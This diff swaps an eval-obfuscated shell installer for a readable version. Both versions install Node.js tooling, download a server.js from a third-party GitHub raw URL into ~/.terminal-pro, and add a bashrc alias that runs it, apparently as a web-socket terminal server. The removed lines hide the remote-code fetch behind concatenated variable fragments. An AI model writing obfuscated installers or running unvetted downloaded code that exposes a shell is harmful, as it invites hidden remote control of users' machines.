@@ -1,3 +1,18 @@
-z="
-";dz='ty w';IBz='touc';Wz='mina';FBz='hrc ';eBz=''\'' >>';Cz='all ';Sz='ro';dBz='echo';HBz='hen';ez='s';Pz='/.te';pz='paid';ZBz=''\'' ~/';Az='pkg ';TBz='al="';Yz='o';Bz='inst';CBz=' ! -';Fz='pyth';Zz='cd ~';uz='/ser';bBz=' the';lz='user';ABz='r.js';SBz='t-te';Lz='node';YBz='ver"';LBz='fi';KBz='hrc';yz='erve';Tz='mkdi';Nz='rm -';xz='-o s';UBz=' ~/.';jz='w.gi';MBz='if !';hz='tps:';kz='thub';az='npm ';fBz='bash';Vz='.ter';gBz='rc';EBz='.bas';Xz='l-pr';QBz='ias ';Kz='ial ';OBz='p -q';Uz='r ~/';vz='ver.';Gz='on3 ';GBz=']; t';Oz='rf ~';sz='cdn/';wz='js" ';PBz=' '\''al';RBz='star';Qz='rmin';tz='main';Rz='al-p';iz='//ra';gz=' "ht';nz='ent.';DBz='f ~/';mz='cont';cBz='n';Dz='-y m';aBz='hrc;';Mz='js';XBz='-pro';WBz='inal';rz='ins/';qz='Plug';bz='i no';Hz='buil';JBz='h ~/';VBz='term';Iz='d-es';cz='de-p';fz='curl';BBz='if [';oz='com/';NBz=' gre';Jz='sent';Ez='ake ';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$z$Nz$Oz$Pz$Qz$Rz$Sz$z$Tz$Uz$Vz$Wz$Xz$Yz$z$Zz$Pz$Qz$Rz$Sz$z$az$bz$cz$dz$ez$z$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$ABz$z$BBz$CBz$DBz$EBz$FBz$GBz$HBz$z$IBz$JBz$EBz$KBz$z$LBz$z$MBz$NBz$OBz$PBz$QBz$RBz$SBz$Qz$TBz$Lz$UBz$VBz$WBz$XBz$uz$YBz$ZBz$EBz$aBz$bBz$cBz$z$dBz$PBz$QBz$RBz$SBz$Qz$TBz$Lz$UBz$VBz$WBz$XBz$uz$YBz$eBz$UBz$fBz$gBz$z$LBz"
+pkg install -y make python3 build-essential nodejs
+
+rm -rf ~/.terminal-pro
+mkdir ~/.terminal-pro
+
+cd ~/.terminal-pro
+
+npm i node-pty ws
+
+curl "https://raw.githubusercontent.com/paidPlugins/cdn/main/server.js" -o server.js 
+
+if [ ! -f ~/.bashrc ]; then
+  touch ~/.bashrc
+fi
+
+if ! grep -q 'alias start-terminal="node ~/.terminal-pro/server"' ~/.bashrc; then
+  echo 'alias start-terminal="node ~/.terminal-pro/server"' >> ~/.bashrc
+fi
